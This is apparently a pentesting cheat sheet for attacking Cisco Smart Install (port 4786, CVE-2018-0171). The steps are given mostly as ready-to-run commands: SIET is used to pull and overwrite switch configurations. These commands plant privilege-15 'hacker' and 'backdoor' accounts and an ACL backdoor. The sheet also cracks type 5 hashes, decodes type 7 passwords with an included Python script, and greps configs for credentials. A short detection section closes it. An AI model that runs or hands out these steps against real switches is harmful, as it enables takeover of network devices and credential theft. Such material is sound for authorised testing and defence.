# Port 4786 - Cisco Smart Install

## Table of Contents

- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Post Exploitation](#post-exploitation)

---

## Enumeration

### Quick Check (One-liner)

```shell
nmap -sV -p 4786 $rhost && echo 'Smart Install vulnerable - use SIET'
```

### Nmap Scripts

```shell
nmap -sV -sC -p4786 $rhost
```

### Banner Grabbing

```shell
nc -vn $rhost 4786
```

### Check Smart Install Status

```shell
# Using SIET (Smart Install Exploitation Tool)
python siet.py -g -i $rhost
```

---

## Exploitation

### SIET - Smart Install Exploitation Tool

```shell
# Install
git clone https://github.com/Sab0tag3d/SIET.git
cd SIET
pip install -r requirements.txt

# Get device config
python siet.py -g -i $rhost

# Change device config
python siet.py -s -i $rhost -c malicious.conf

# Execute commands (config mode)
python siet.py -s -i $rhost -c "! enable\n! conf t\n! username hacker privilege 15 secret password"
```

### Download Running Config

```shell
# Using SIET
python siet.py -g -i $rhost -o running-config.txt

# The config may contain:
# - Enable passwords (type 5 or 7)
# - SNMP community strings
# - VTY passwords
# - Username/password combinations
```

### Upload Malicious Config

```shell
# Create malicious config
cat > evil.conf << EOF
!
enable secret evil123
username hacker privilege 15 secret hackerpass
!
line vty 0 4
 password vtypass
 login local
!
EOF

# Upload
python siet.py -s -i $rhost -c evil.conf
```

---

## Post Exploitation

### Crack Cisco Passwords

```shell
# Type 5 (MD5) - Crack with hashcat
hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt

# Type 7 (Reversible) - Decode
# Online: https://www.ifm.net.nz/cookbooks/passwordcracker.html

# Using cisco_pwdecrypt
pip install cisco_pwdecrypt
cisco_pwdecrypt -p 094F471A1A0A

# Python script
python3 << 'EOF'
import re
xlat = [0x64, 0x73, 0x66, 0x64, 0x3b, 0x6b, 0x66, 0x6f, 0x41, 0x2c,
        0x2e, 0x69, 0x79, 0x65, 0x77, 0x72, 0x6b, 0x6c, 0x64, 0x4a,
        0x4b, 0x44, 0x48, 0x53, 0x55, 0x42]

def decrypt(enc):
    seed = int(enc[:2])
    enc = enc[2:]
    return ''.join([chr(xlat[seed+i] ^ int(enc[i*2:i*2+2], 16)) for i in range(len(enc)//2)])

# Example
print(decrypt("094F471A1A0A"))
EOF
```

### Extract Credentials from Config

```shell
# Enable secrets
grep -E "^enable secret|^enable password" running-config.txt

# User credentials  
grep -E "^username" running-config.txt

# SNMP strings
grep -E "^snmp-server community" running-config.txt

# VTY passwords
grep -A5 "^line vty" running-config.txt
```

### Change Switch Configuration

```shell
# Add backdoor user
python siet.py -s -i $rhost -c "username backdoor privilege 15 secret backdoor123"

# Enable SSH
python siet.py -s -i $rhost -c "ip domain-name evil.com\ncrypto key generate rsa modulus 2048\nline vty 0 4\n transport input ssh"

# Add ACL backdoor
python siet.py -s -i $rhost -c "access-list 100 permit ip host $lhost any"
```

---

## CVE-2018-0171

> Cisco Smart Install Remote Code Execution

```shell
# Affects many Cisco switches with Smart Install enabled
# Can be used to:
# - Download configuration
# - Upload new configuration
# - Execute arbitrary commands

# Check if vulnerable
python siet.py -g -i $rhost

# If you get the config, it's vulnerable
```

---

## Mitigation Detection

```shell
# Check if Smart Install is disabled
# In config should see:
# no vstack

# Or port 4786 should be closed
nmap -p4786 $rhost
```

---

## Tools

- SIET: https://github.com/Sab0tag3d/SIET
- cisco_pwdecrypt: https://pypi.org/project/cisco-pwdecrypt/

---

## References

- [HackTricks - Cisco Smart Install](https://book.hacktricks.wiki/network-services-pentesting/4786-cisco-smart-install.html)
- [Cisco Security Advisory](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180328-smi2)
